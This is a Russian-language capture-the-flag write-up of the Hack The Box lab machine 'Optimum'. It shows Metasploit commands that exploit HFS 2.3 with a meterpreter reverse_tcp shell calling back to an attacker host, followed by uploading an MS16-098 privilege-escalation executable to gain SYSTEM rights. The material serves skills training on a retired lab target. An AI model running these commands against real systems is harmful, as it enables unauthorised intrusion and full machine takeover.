# Optimum

**Плошадка:** https://hackthebox.com
**Уровень:** Medium
**Задача:** Найти файлы **user.txt** и **root.txt** на машине жертвы 

Сегодня мы будем решать задачу «Optimum», разработанную на базе платформы Hack the Box. Эта лабораторная работа подпадает под категорию изъятых из использования с целью оттачивания навыков пентестера в онлайне. Решение этой задачи не очень сложное, если вы владеете соответствующими знаниями. Сразу же приступаем к делу.

## Разведка

Как обычно, начинаем со сканирования портов.

```bash
nmap -A 10.10.10.8
```

![[Pasted image 20230705090740.png]]

По результатам сканирования выяснилось, что открыт 80-й порт, на котором крутится файловый сервер HFS 2.3. 

## Поиск эксплойта

В процессе поиска нашлась ссылка на нужный эксплоит для Metasploit.

![[Pasted image 20230705090818.png]]

Затем запускаем в терминале команду msfconsole, загружаем Metasploit Framework для использования вышеуказанного эксплоита и вводим следующие команды:

## Эксплуатация 

```metasploit
use exploit/windows/http/rejetto_hfs_exec
msf exploit(windows/http/rejetto_hfs_exec) >set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) >set rhost 10.10.10.8
msf exploit(windows/http/rejetto_hfs_exec) >set lhost 10.10.14.6
msf exploit(windows/http/rejetto_hfs_exec) >set svrhost 10.10.14.6
msf exploit(windows/http/rejetto_hfs_exec) >exploit
```

Если все сработало правильно, появится сессия meterpreter session 1, как показано на рисунке ниже. Далее
после запуска команды sysinfo можно получить информацию о системе жертвы.

![[Pasted image 20230705091322.png]]

Теперь попробуем поискать файлы user.txt и root.txt, которые скрыты в одной из директорий. 

Внутри директории `c:\Document and Setting \kostas\Desktop`  я нашел файл user.txt. Для просмотра содержимого этого файла использовалась команда cat.

```bash
cat user.txt.txt
```

Первая часть задачи решена.

![[Pasted image 20230705091420.png]]

![[Pasted image 20230705091427.png]]

## Повышение привилегий

Вторая часть задачи, связанная с поиском файла root.txt, отняла у меня намного больше времени. Все эксплоиты, рекомендованные recon/local_exploit_suggester, у меня не сработали. Затем я начал искать эксплоиты для Windows Server и нашел «MS16-098exploit 41020». Я просто загрузил исполняемый файл и воспользовался ручным расширением привилегий.

![[Pasted image 20230705091850.png]]

После загрузки исполняемого файла я переправил эксплоит на целевую машину через meterpreter-сессию при помощи следующих команд:

```
Meterpreter> upload /root/Desktop/41020.exe .
Meterpreter> shell
```

После запуска команды whoami я убедился, что теперь у меня есть системные права `(nt authority\system)`.

![[Pasted image 20230705091956.png]]

Внутри директории c:\Document and Setting \Administrator\Desktop я нашел файл root.txt. Для просмотра содержимого этого файла я воспользовался командой type. 

```
type root.txt
```

Таким образом, мы решили вторую часть задачи.

---
 
